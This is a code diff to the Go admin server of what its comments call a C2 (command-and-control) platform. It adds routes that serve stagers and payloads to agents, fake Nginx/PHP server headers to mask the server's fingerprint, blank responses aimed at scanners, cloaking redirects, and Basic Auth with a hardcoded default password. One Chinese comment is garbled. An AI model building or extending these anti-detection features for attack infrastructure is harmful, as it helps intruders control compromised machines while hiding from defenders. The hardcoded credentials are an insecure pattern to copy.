@@ -36,10 +36,33 @@ func main() {
 	adminRouter := gin.New()
 	adminRouter.Use(gin.Logger(), gin.Recovery())
 
+	// CORS: 仅允许来自同一主机的请求（C2平台无需跨域），防止 CSRF
 	corsConfig := cors.DefaultConfig()
-	corsConfig.AllowAllOrigins = true
+	corsConfig.AllowAllOrigins = false
+	corsConfig.AllowOriginFunc = func(origin string) bool {
+		// 允许同源（相同主机和端口）以及本地开发地址
+		allowedPrefixes := []string{
+			"http://127.0.0.1",
+			"https://127.0.0.1",
+			"http://localhost",
+			"https://localhost",
+		}
+		for _, prefix := range allowedPrefixes {
+			if strings.HasPrefix(origin, prefix) {
+				return true
+			}
+		}
+		return false
+	}
 	corsConfig.AllowHeaders = []string{"Origin", "Content-Length", "Content-Type", "Authorization"}
 	adminRouter.Use(cors.New(corsConfig))
+
+	// OpSec Middleware: Mask server fingerprints
+	adminRouter.Use(func(c *gin.Context) {
+		c.Writer.Header().Set("Server", "Nginx/1.18.0 (Ubuntu)")
+		c.Writer.Header().Set("X-Powered-By", "PHP/7.4.3") // Fake technology stack
+		c.Next()
+	})
 
 	adminRouter.Use(middleware.AuthMiddleware())
 
@@ -120,9 +143,13 @@ func main() {
 			settings.DELETE("/webhooks/:id", controllers.HandleDeleteWebhook)
 		}
 
+		api.POST("/agents/connect", controllers.HandleConnectBindAgent)
 		api.POST("/generate", controllers.HandleGenerate)
 		api.GET("/generate/stream", controllers.HandleGenerateStream)
-		api.Static("/downloads", "./storage/payloads")
+		api.GET("/stager", controllers.HandleGetStager)
+		api.GET("/s/:id", controllers.HandleServePayload)
+		// 保护下载：不再致录暴露，改为通过控制器注入 AuthMiddleware 展中提供文件
+		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)
 
 		api.POST("/auth/login", controllers.HandleLogin)
 		api.POST("/auth/logout", func(c *gin.Context) { c.JSON(200, gin.H{"msg": "logged out"}) })
@@ -137,14 +164,40 @@ func main() {
 	adminRouter.NoRoute(func(c *gin.Context) {
 		path := c.Request.URL.Path
 		cloakTarget := store.GetSetting("opsec_cloak_url")
-		if cloakTarget != "" && !strings.HasPrefix(path, "/api/") {
+
+		// 1. Handle API 404 (Cleanup) - No Auth needed here as it's handled by middleware
+		if strings.HasPrefix(path, "/api/") {
+			c.Status(http.StatusNotFound)
+			c.Abort()
+			return
+		}
+
+		// 2. OpSec Layer: HTTP Basic Auth for Web UI (The "Nginx Style" Lock)
+		user, password, hasAuth := c.Request.BasicAuth()
+		secretUser := store.GetSetting("web_auth_user")
+		secretPass := store.GetSetting("web_auth_password")
+
+		// Default credentials if not yet set in DB
+		if secretUser == "" { secretUser = "admin" }
+		if secretPass == "" { secretPass = "cupcake" }
+
+		if !hasAuth || user != secretUser || password != secretPass {
+			// Trigger browser login popup
+			c.Writer.Header().Set("WWW-Authenticate", `Basic realm="Restricted Content"`)
+			c.Status(http.StatusUnauthorized)
+			// Return blank page for scanners
+			c.Writer.Write([]byte("")) 
+			c.Abort()
+			return
+		}
+
+		// 3. For non-API routes when authorized, handle Cloaking (if path is weird)
+		if cloakTarget != "" && path != "/" && path != "/index.html" && !strings.Contains(path, "assets") {
 			c.Redirect(http.StatusFound, cloakTarget)
 			return
 		}
-		if strings.HasPrefix(path, "/api/") {
-			c.JSON(404, gin.H{"error": "API not found"})
-			return
-		}
+
+		// 4. Serve Static Files (Vue UI)
 		cleanPath := strings.TrimPrefix(path, "/")
 		if cleanPath == "" { cleanPath = "index.html" }
 		f, err := distFS.Open(cleanPath)
@@ -153,6 +206,8 @@ func main() {
 			staticServer.ServeHTTP(c.Writer, c.Request)
 			return
 		}
+
+		// SPA Fallback
 		index, _ := distFS.Open("index.html")
 		defer index.Close()
 		stat, _ := index.Stat()
